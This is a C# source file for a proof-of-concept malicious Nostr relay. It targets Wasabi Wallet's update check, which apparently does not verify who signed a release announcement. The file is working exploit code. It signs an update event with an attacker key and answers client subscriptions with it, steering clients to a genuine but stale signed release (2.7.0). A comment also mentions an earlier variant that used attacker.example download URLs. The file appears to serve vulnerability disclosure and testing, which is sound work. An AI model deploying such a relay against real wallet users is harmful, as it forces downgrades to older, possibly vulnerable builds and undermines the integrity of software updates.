using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using NBitcoin.Secp256k1;

// Malicious Nostr relay for the Wasabi stale-version-pinning PoC.
//
// Unlike poc-nostr-forgery (which announced a made-up version 99.99.99 with
// http://attacker.example URLs to prove the event is accepted at all), this relay
// announces a REAL, OLDER, genuinely Wasabi-signed release (2.7.0) and points every
// asset URL at the authentic GitHub-hosted files. Nothing here is forged except the
// Nostr event's authorship: the event is validly signed by an attacker key that is
// NOT the Wasabi team key, which the pre-fix WasabiNostrClient never checks.
//
// The point: when this flows through the production ReleaseDownloader, the genuine
// SHA256SUMS.wasabisig verifies against the hardcoded WasabiPubKey and the installer
// hash matches, so the client downloads, verifies, and readies a stale build for
// install. See the Poc project.

class FakeRelay
{
    // Attacker-controlled keypair (NOT the Wasabi team key).
    static readonly ECPrivKey AttackerKey = ECPrivKey.Create(Convert.FromHexString(
        "0101010101010101010101010101010101010101010101010101010101010101"));
    static readonly string AttackerPubHex = Convert.ToHexString(AttackerKey.CreateXOnlyPubKey().ToBytes()).ToLowerInvariant();

    // A real, older release. Current at time of writing is 2.8.2.
    const string StaleVersion = "2.7.0";
    const string Base = "https://github.com/WalletWasabi/WalletWasabi/releases/download/v" + StaleVersion;

    static async Task Main()
    {
        var listener = new HttpListener();
        listener.Prefixes.Add("http://127.0.0.1:7777/");
        listener.Start();
        Console.WriteLine($"[RELAY] listening on ws://127.0.0.1:7777  attacker pubkey = {AttackerPubHex}");
        Console.WriteLine($"[RELAY] will announce genuine, signed, but STALE Wasabi {StaleVersion}");

        while (true)
        {
            var ctx = await listener.GetContextAsync();
            if (!ctx.Request.IsWebSocketRequest) { ctx.Response.StatusCode = 400; ctx.Response.Close(); continue; }
            var wsCtx = await ctx.AcceptWebSocketAsync(null);
            _ = Task.Run(() => Handle(wsCtx.WebSocket));
        }
    }

    static async Task Handle(WebSocket ws)
    {
        var buf = new byte[64 * 1024];
        while (ws.State == WebSocketState.Open)
        {
            var res = await ws.ReceiveAsync(buf, CancellationToken.None);
            if (res.MessageType == WebSocketMessageType.Close)
            {
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, null, CancellationToken.None);
                return;
            }
            var txt = Encoding.UTF8.GetString(buf, 0, res.Count);
            if (txt.Contains("\"REQ\""))
            {
                Console.WriteLine("[RELAY] REQ: " + txt);
                var doc = JsonDocument.Parse(txt);
                var subId = doc.RootElement[1].GetString()!;
                var filterAuthor = doc.RootElement[2].GetProperty("authors")[0].GetString()!;
                Console.WriteLine($"[RELAY] client asked for author = {filterAuthor} (the Wasabi team npub)");
                Console.WriteLine($"[RELAY] replying with event signed by ATTACKER key {AttackerPubHex} instead");

                var ev = BuildStaleAnnouncement();
                var frame = "[\"EVENT\"," + JsonSerializer.Serialize(subId) + "," + ev + "]";
                await ws.SendAsync(Encoding.UTF8.GetBytes(frame), WebSocketMessageType.Text, true, CancellationToken.None);

                var eose = "[\"EOSE\"," + JsonSerializer.Serialize(subId) + "]";
                await ws.SendAsync(Encoding.UTF8.GetBytes(eose), WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine("[RELAY] stale-but-genuine EVENT + EOSE sent.");
            }
            else if (txt.Contains("\"CLOSE\"")) return;
        }
    }

    static string BuildStaleAnnouncement()
    {
        var tags = new object[][]
        {
            new object[]{ "version", StaleVersion },
            // Every URL below is the authentic Wasabi GitHub release asset for 2.7.0.
            new object[]{ "SHA256SUMS",           $"{Base}/SHA256SUMS" },
            new object[]{ "SHA256SUMS.asc",        $"{Base}/SHA256SUMS.asc" },
            new object[]{ "SHA256SUMS.wasabisig",  $"{Base}/SHA256SUMS.wasabisig" },
            new object[]{ $"Wasabi-{StaleVersion}.deb",                 $"{Base}/Wasabi-{StaleVersion}.deb" },
            new object[]{ $"Wasabi-{StaleVersion}-linux-x64.tar.gz",    $"{Base}/Wasabi-{StaleVersion}-linux-x64.tar.gz" },
            new object[]{ $"Wasabi-{StaleVersion}.msi",                 $"{Base}/Wasabi-{StaleVersion}.msi" },
            new object[]{ $"Wasabi-{StaleVersion}.dmg",                 $"{Base}/Wasabi-{StaleVersion}.dmg" },
            new object[]{ $"Wasabi-{StaleVersion}-arm64.dmg",           $"{Base}/Wasabi-{StaleVersion}-arm64.dmg" },
        };
        var createdAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var content = $"Wasabi Wallet v{StaleVersion} available";

        // NIP-01 id preimage: [0, pubkey, created_at, kind, tags, content]
        var preimage = JsonSerializer.Serialize(new object[] { 0, AttackerPubHex, createdAt, 1, tags, content });
        var idBytes = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(preimage));
        var id = Convert.ToHexString(idBytes).ToLowerInvariant();

        // BIP-340 Schnorr sign with the attacker key. This passes NNostr's wire-level
        // Verify() because id and signature are internally consistent; only the SIGNER
        // IDENTITY is wrong, and the pre-fix client never checks it.
        var sig = AttackerKey.SignBIP340(idBytes);
        var sigHex = Convert.ToHexString(sig.ToBytes()).ToLowerInvariant();

        return JsonSerializer.Serialize(new
        {
            id,
            pubkey = AttackerPubHex,
            created_at = createdAt,
            kind = 1,
            tags,
            content,
            sig = sigHex
        });
    }
}
